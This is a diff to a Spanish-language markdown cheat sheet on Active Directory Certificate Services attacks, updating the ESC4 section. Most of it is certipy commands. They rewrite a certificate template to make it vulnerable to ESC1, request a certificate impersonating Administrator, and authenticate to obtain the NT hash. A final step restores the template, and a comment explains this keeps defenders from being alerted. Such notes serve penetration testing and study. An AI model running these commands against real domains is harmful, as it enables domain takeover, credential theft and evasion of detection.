@@ -125,22 +125,27 @@ certipy auth -pfx administrator.pfx -dc-ip <ip_dc>
 **Condiciones:** El usuario tiene `WriteProperty`, `WriteDacl` o `WriteOwner` sobre una plantilla existente — puede modificarla para convertirla en vulnerable a ESC1.
 
 ```shell
-# Modificar la plantilla (guarda config original con -save-old)
-certipy template -u <usuario>@<dominio> -p <contraseña> \
-  -template <plantilla> -save-old -dc-ip <ip_dc>
+# 1. Modificar la plantilla para vulnerabilizarla a ESC1
+# -write-default-configuration fuerza los cambios maliciosos en AD
+# y genera automáticamente un backup JSON de la configuración original
+certipy template -u <usuario>@<dominio> -p '<contraseña>' \
+  -template <plantilla> -write-default-configuration -dc-ip <ip_dc>
 
-# Solicitar certificado como Administrator
-certipy req -u <usuario>@<dominio> -p <contraseña> -dc-ip <ip_dc> \
-  -ca <ca> -target <dc> -template <plantilla> -upn administrator@<dominio>
+# 2. Solicitar certificado como Administrator
+# El parámetro -ca requiere el nombre exacto de la CA (ej. sequel-DC01-CA)
+certipy req -u <usuario>@<dominio> -p '<contraseña>' -dc-ip <ip_dc> \
+  -ca '<nombre_ca>' -template <plantilla> -upn administrator@<dominio>
 
-# Autenticar
-certipy auth -pfx administrator.pfx -domain <dominio> -u administrator -dc-ip <ip_dc>
+# 3. Autenticar y obtener el hash NT
+certipy auth -pfx administrator.pfx -domain <dominio> -dc-ip <ip_dc>
 
-# Restaurar configuración original (opcional, para no dejar rastro)
-certipy template -u <usuario>@<dominio> -p <contraseña> \
-  -template <plantilla> -configuration <plantilla>.json -dc-ip <ip_dc>
+# 4. Restaurar la configuración original (limpieza obligatoria)
+# El archivo JSON con el backup se generó automáticamente en el paso 1
+certipy template -u <usuario>@<dominio> -p '<contraseña>' \
+  -template <plantilla> -write-configuration <plantilla>.json -dc-ip <ip_dc>
 ```
 
+> 💡 El paso 4 es importante en entornos reales — dejar la plantilla modificada puede alertar a los defensores y romper servicios legítimos que dependan de ella.
 ---
 
 ## ESC5 — Control de escritura sobre objetos PKI
